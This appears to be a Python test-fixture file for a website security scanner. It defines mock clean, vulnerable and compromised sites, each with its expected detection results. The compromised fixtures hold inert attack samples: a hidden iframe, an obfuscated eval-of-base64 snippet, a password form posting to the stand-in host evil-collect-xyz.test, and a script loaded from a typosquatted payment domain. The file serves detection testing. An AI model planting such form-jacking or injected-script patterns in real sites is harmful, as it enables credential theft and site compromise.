# WebHound — scanner/validation/ground_truth.py
# Phase-12 validation lab: the ground-truth database (Task 1).
#
# Each target is a SAFE mock website (HTML + headers + status) plus a
# declaration of exactly what a correct scan should — and should NOT —
# find. The real Scanner runs against these via a mock transport
# (benchmark_runner), and the reports measure how close the actual
# output is to ground truth.
#
# Targets are grouped into three categories:
#   clean        — well-built sites on each platform; few/no findings
#   vulnerable   — sites with deliberate (safe, simulated) weaknesses
#   compromised  — sites with safe SIMULATED compromise indicators
#
# Nothing here is a real vulnerability or real malware — every payload
# is inert mock markup that exercises the detection engines.

from __future__ import annotations

from dataclasses import dataclass, field


@dataclass(frozen=True)
class ExpectedFinding:
    """One finding a correct scan must (or must not) produce."""

    engine: str
    title_substring: str
    min_severity: str | None = None        # e.g. "high"
    finding_type: str | None = None        # confirmed_risk / hardening / ...
    confidence_label: str | None = None    # confirmed / high / medium / ...

    def matches(self, finding) -> bool:
        if (getattr(finding, "scanner_engine", "") or "").lower() != \
                self.engine.lower():
            return False
        title = (getattr(finding, "title", "") or "").lower()
        if self.title_substring.lower() not in title:
            return False
        if self.min_severity is not None:
            from webhound.models.severity import Severity
            try:
                wanted = Severity(self.min_severity.lower())
            except ValueError:
                wanted = None
            if wanted is not None and finding.severity.rank < wanted.rank:
                return False
        return True


@dataclass(frozen=True)
class GroundTruthTarget:
    """A safe mock website + its expected scan outcome."""

    name: str
    category: str                    # clean | vulnerable | compromised
    framework: str | None            # expected primary framework, if any
    html: str
    headers: dict[str, str] = field(default_factory=dict)
    status: int = 200
    # Extra routes the mock site serves beyond "/" — path → (status,
    # body, content_type). Lets a target simulate /admin, /.env,
    # /api/..., a redirect, etc. so the sensitive_paths / endpoint /
    # redirect engines have something real to find. Defaults empty
    # (everything non-root 404s).
    routes: tuple[tuple[str, int, str, str], ...] = ()
    expected_findings: tuple[ExpectedFinding, ...] = ()
    forbidden_findings: tuple[ExpectedFinding, ...] = ()   # FP guards
    expected_risk_min: int | None = None
    expected_risk_max: int | None = None
    notes: str = ""


# Shared header fixtures.
_HTML_CT = {"content-type": "text/html; charset=utf-8"}
_SECURE_HEADERS = {
    **_HTML_CT,
    "content-security-policy": "default-src 'self'",
    "strict-transport-security": "max-age=63072000; includeSubDomains",
    "x-content-type-options": "nosniff",
    "x-frame-options": "DENY",
    "referrer-policy": "strict-origin-when-cross-origin",
}


# ---------------------------------------------------------------------------
# CLEAN framework sites (Task: clean targets, one per platform)
# ---------------------------------------------------------------------------

_CLEAN: tuple[GroundTruthTarget, ...] = (
    GroundTruthTarget(
        name="clean_wordpress",
        category="clean", framework="WordPress",
        html=('<!DOCTYPE html><html><head>'
              '<meta name="generator" content="WordPress 6.4.2">'
              '<link rel="https://api.w.org/" href="https://t.test/wp-json/">'
              '<script src="https://t.test/wp-includes/js/jquery.js"></script>'
              '</head><body class="wp-embed"><h1>Blog</h1></body></html>'),
        headers={**_SECURE_HEADERS, "x-powered-by": "WordPress"},
        forbidden_findings=(
            ExpectedFinding("injected_js", "injected"),
            ExpectedFinding("threat_intel", "malicious"),
        ),
        expected_risk_max=40,
        notes="Well-configured WordPress; secure headers, no compromise.",
    ),
    GroundTruthTarget(
        name="clean_shopify",
        category="clean", framework="Shopify",
        html=('<!DOCTYPE html><html><head>'
              '<script>window.Shopify={};</script>'
              '<script src="https://cdn.shopify.com/s/files/1/x/theme.js">'
              '</script></head><body data-shopify><h1>Shop</h1></body></html>'),
        headers={**_SECURE_HEADERS, "x-shopify-stage": "production",
                 "x-shopid": "12345"},
        forbidden_findings=(
            ExpectedFinding("threat_intel", "malicious"),
            ExpectedFinding("hidden_iframes", "hidden"),
        ),
        expected_risk_max=40,
        notes="Clean Shopify storefront.",
    ),
    GroundTruthTarget(
        name="clean_webflow",
        category="clean", framework="Webflow",
        html=('<!DOCTYPE html><html data-wf-page="1" data-wf-site="2">'
              '<head><meta name="generator" content="Webflow">'
              '<script src="https://assets.website-files.com/x/webflow.js">'
              '</script></head><body class="w-body"><h1>Site</h1></body></html>'),
        headers=_SECURE_HEADERS,
        expected_risk_max=40,
        notes="Clean Webflow site.",
    ),
    GroundTruthTarget(
        name="clean_wix",
        category="clean", framework="Wix",
        html=('<!DOCTYPE html><html><head>'
              '<meta name="generator" content="Wix.com Website Builder">'
              '<script src="https://static.parastorage.com/x/app.js"></script>'
              '</head><body><div id="SITE_CONTAINER"></div></body></html>'),
        headers={**_SECURE_HEADERS, "x-wix-request-id": "abc"},
        expected_risk_max=40,
        notes="Clean Wix site.",
    ),
    GroundTruthTarget(
        name="clean_nextjs",
        category="clean", framework="Next.js",
        html=('<!DOCTYPE html><html><head>'
              '<script src="https://t.test/_next/static/chunks/main-abc.js">'
              '</script><script id="__NEXT_DATA__" type="application/json">'
              '{"page":"/"}</script></head>'
              '<body><div id="__next"><h1>App</h1></div></body></html>'),
        headers={**_SECURE_HEADERS, "x-powered-by": "Next.js"},
        expected_risk_max=40,
        notes="Clean Next.js app.",
    ),
    GroundTruthTarget(
        name="clean_react_spa",
        category="clean", framework="React",
        html=('<!DOCTYPE html><html><head>'
              '<script src="https://t.test/static/js/main.1a2b3c4d.js"></script>'
              '<script src="https://t.test/static/js/react-dom.production.min.js">'
              '</script></head><body><div id="root" data-reactroot></div>'
              '</body></html>'),
        headers=_SECURE_HEADERS,
        expected_risk_max=40,
        notes="Clean React SPA.",
    ),
    GroundTruthTarget(
        name="clean_vue_spa",
        category="clean", framework="Vue",
        html=('<!DOCTYPE html><html><head>'
              '<script src="https://t.test/_nuxt/entry.abc123de.js"></script>'
              '<script>window.__NUXT__={};</script></head>'
              '<body><div id="__nuxt"><div data-v-1a2b3c4d></div></div>'
              '</body></html>'),
        headers=_SECURE_HEADERS,
        expected_risk_max=40,
        notes="Clean Vue/Nuxt SPA.",
    ),
    GroundTruthTarget(
        name="clean_angular_spa",
        category="clean", framework="Angular",
        html=('<!DOCTYPE html><html><head>'
              '<script src="https://t.test/main.1a2b3c4d5e.js"></script>'
              '<script src="https://t.test/polyfills.9f8e7d6c5b.js"></script>'
              '</head><body><app-root ng-version="17.0.1"></app-root>'
              '</body></html>'),
        headers=_SECURE_HEADERS,
        expected_risk_max=40,
        notes="Clean Angular SPA.",
    ),
)


# ---------------------------------------------------------------------------
# VULNERABLE sites (safe, simulated weaknesses)
# ---------------------------------------------------------------------------

_VULN: tuple[GroundTruthTarget, ...] = (
    GroundTruthTarget(
        name="vuln_missing_csp",
        category="vulnerable", framework=None,
        html='<!DOCTYPE html><html><head><title>x</title></head><body>hi</body></html>',
        headers=_HTML_CT,                  # no CSP, no HSTS
        expected_findings=(
            ExpectedFinding("security_headers", "content-security-policy",
                            finding_type="hardening"),
            ExpectedFinding("security_headers", "hsts"),
        ),
        notes="No security headers — hardening gaps expected.",
    ),
    GroundTruthTarget(
        name="vuln_insecure_cookie",
        category="vulnerable", framework=None,
        html='<!DOCTYPE html><html><body>hi</body></html>',
        headers={**_HTML_CT, "set-cookie": "sessionid=abc123; Path=/"},
        expected_findings=(
            ExpectedFinding("cookie_scanner", "missing the Secure flag",
                            min_severity="high"),
            ExpectedFinding("cookie_scanner", "missing HttpOnly",
                            min_severity="high"),
        ),
        notes="Session cookie missing Secure + HttpOnly.",
    ),
    GroundTruthTarget(
        name="vuln_sensitive_path",
        category="vulnerable", framework=None,
        html='<!DOCTYPE html><html><body>home</body></html>',
        headers=_HTML_CT,
        routes=(("/.env", 200,
                 "DB_PASSWORD=secret123\nAPP_KEY=base64:xyz\nSECRET_TOKEN=abc",
                 "text/plain"),),
        expected_findings=(
            ExpectedFinding("sensitive_paths", "environment variable file",
                            min_severity="critical"),
        ),
        expected_risk_min=30,
        notes="Exposed .env (mock secrets) — critical confirmed exposure.",
    ),
    GroundTruthTarget(
        name="vuln_admin_portal",
        category="vulnerable", framework=None,
        html='<!DOCTYPE html><html><body><a href="/admin">admin</a></body></html>',
        headers=_HTML_CT,
        routes=(("/admin", 200,
                 '<html><head><title>Admin Panel</title></head><body>'
                 '<h1>Admin Panel</h1></body></html>', "text/html"),),
        expected_findings=(
            ExpectedFinding("sensitive_paths", "admin panel"),
        ),
        notes="Publicly reachable admin panel.",
    ),
    GroundTruthTarget(
        name="vuln_exposed_api",
        category="vulnerable", framework=None,
        html=("<!DOCTYPE html><html><body><script>"
              "fetch('/api/v1/users');fetch('/api/admin/config')"
              "</script></body></html>"),
        headers=_HTML_CT,
        expected_findings=(
            ExpectedFinding("endpoint_discovery", "admin api",
                            min_severity="high"),
            ExpectedFinding("endpoint_discovery", "api surface mapped"),
        ),
        notes="Admin API referenced from public client code.",
    ),
    GroundTruthTarget(
        name="vuln_third_party_script_risk",
        category="vulnerable", framework=None,
        html=('<!DOCTYPE html><html><body>'
              '<script src="https://random-unknown-xyz123.test/t.js"></script>'
              '</body></html>'),
        headers=_HTML_CT,
        expected_findings=(
            ExpectedFinding("third_party_domains",
                            "subresource integrity"),
        ),
        notes="External script with no SRI from an unrecognised host.",
    ),
    GroundTruthTarget(
        name="vuln_insecure_login_form",
        category="vulnerable", framework=None,
        html=('<!DOCTYPE html><html><body>'
              '<form action="http://t.test/login" method="post">'
              '<input type="password" name="pw"></form></body></html>'),
        headers=_HTML_CT,
        expected_findings=(
            ExpectedFinding("form_risk", "insecure http url",
                            min_severity="high"),
        ),
        notes="Password form submits to a plain-HTTP action.",
    ),
    GroundTruthTarget(
        name="vuln_correlation_chain",
        category="vulnerable", framework=None,
        # No CSP + external (unknown) script + inline eval — the three
        # signals the correlation engine compounds into one cluster.
        html=('<!DOCTYPE html><html><head></head><body>'
              '<script src="https://unknown-cdn-zzz.test/x.js"></script>'
              '<script>eval(atob("YWxlcnQoMSk="))</script>'
              '</body></html>'),
        headers=_HTML_CT,                  # deliberately no CSP
        expected_findings=(
            ExpectedFinding("correlation", "correlated threat chain"),
        ),
        notes="Exercises the correlation engine: CSP-missing + external "
              "script + inline eval compounding risk.",
    ),
)


# ---------------------------------------------------------------------------
# COMPROMISED sites (safe, simulated indicators)
# ---------------------------------------------------------------------------

_COMPROMISED: tuple[GroundTruthTarget, ...] = (
    GroundTruthTarget(
        name="compromised_hidden_iframe",
        category="compromised", framework=None,
        html=('<!DOCTYPE html><html><body><h1>Site</h1>'
              '<iframe src="https://evil-sim.test/x" '
              'style="width:0;height:0;border:0;position:absolute;left:-9999px">'
              '</iframe></body></html>'),
        headers=_HTML_CT,
        expected_findings=(
            ExpectedFinding("hidden_iframes", "iframe"),
        ),
        notes="Safe simulated hidden iframe (inert local-test URL).",
    ),
    GroundTruthTarget(
        name="compromised_injected_script",
        category="compromised", framework=None,
        html=('<!DOCTYPE html><html><body><h1>Site</h1><script>'
              'var _0xabc=eval(atob("YWxlcnQoMSk="));'
              'document.write(unescape("%3Cscript%3E"))'
              '</script></body></html>'),
        headers=_HTML_CT,
        expected_findings=(
            ExpectedFinding("injected_js", "decodes-and-evaluates",
                            min_severity="high"),
        ),
        notes="Safe simulated injected script: decode-and-eval pattern.",
    ),
    GroundTruthTarget(
        name="compromised_form_injection",
        category="compromised", framework=None,
        html=('<!DOCTYPE html><html><body>'
              '<form action="https://evil-collect-xyz.test/grab" method="post">'
              '<input type="password" name="pw"></form></body></html>'),
        headers=_HTML_CT,
        expected_findings=(
            ExpectedFinding("form_risk", "credentials to a different domain",
                            min_severity="high"),
        ),
        notes="Safe simulated form-jacking: password form posting off-site.",
    ),
    GroundTruthTarget(
        name="compromised_supply_chain",
        category="compromised", framework=None,
        html=('<!DOCTYPE html><html><body>'
              '<script src="https://cdn-suspicious-9x8z.test/lib.js"></script>'
              '<script>eval(atob("YWxlcnQoMSk="))</script></body></html>'),
        headers=_HTML_CT,
        expected_findings=(
            ExpectedFinding("third_party_domains", "subresource integrity"),
        ),
        forbidden_findings=(),
        notes="Safe simulated supply-chain: external script + obfuscated "
              "inline (correlation chain expected).",
    ),
    GroundTruthTarget(
        name="compromised_brand_impersonation",
        category="compromised", framework=None,
        # Loads a script from a homoglyph/typosquat of a payment brand —
        # exercises the Phase-11 threat-intel impersonation overlay live.
        html=('<!DOCTYPE html><html><body>'
              '<script src="https://paypa1.com/pay.js"></script>'
              '</body></html>'),
        headers=_HTML_CT,
        expected_findings=(
            ExpectedFinding("threat_intel", "likely malicious",
                            min_severity="medium"),
        ),
        notes="Safe simulated brand impersonation: script from a payment-"
              "brand lookalike host. Validates the live threat-intel "
              "impersonation overlay. (Severity is calibrated to MEDIUM "
              "without an external threat-feed confirmation.)",
    ),
)


ALL_TARGETS: tuple[GroundTruthTarget, ...] = _CLEAN + _VULN + _COMPROMISED
CLEAN_TARGETS = _CLEAN
VULNERABLE_TARGETS = _VULN
COMPROMISED_TARGETS = _COMPROMISED


# Honest record (Task 7) of spec-listed targets NOT yet in the lab and
# WHY — these are the real coverage gaps the validation framework
# exists to surface. Each names the blocker so a future phase can close
# it deliberately rather than discovering the gap in production.
KNOWN_COVERAGE_GAPS: tuple[dict[str, str], ...] = (
    {
        "target": "outdated_js_library",
        "blocker": "vulnerable_libs engine exists but is not wired into "
                   "the orchestrator pipeline (dormant) — no detection to "
                   "validate yet.",
    },
    {
        "target": "malicious_redirect",
        "blocker": "suspicious_redirects keys off an observed redirect "
                   "chain; a single-response mock can't present one. "
                   "Needs a redirecting mock route or the browser pass.",
    },
    {
        "target": "new_domain / supply_chain_change",
        "blocker": "these are WADE change-detection signals — they need a "
                   "prior baseline to diff against, so they belong in a "
                   "WADE-specific validation harness (two-scan fixture), "
                   "not the single-scan benchmark.",
    },
)


def targets_by_category(category: str) -> tuple[GroundTruthTarget, ...]:
    return tuple(t for t in ALL_TARGETS if t.category == category)


def target_by_name(name: str) -> GroundTruthTarget | None:
    return next((t for t in ALL_TARGETS if t.name == name), None)
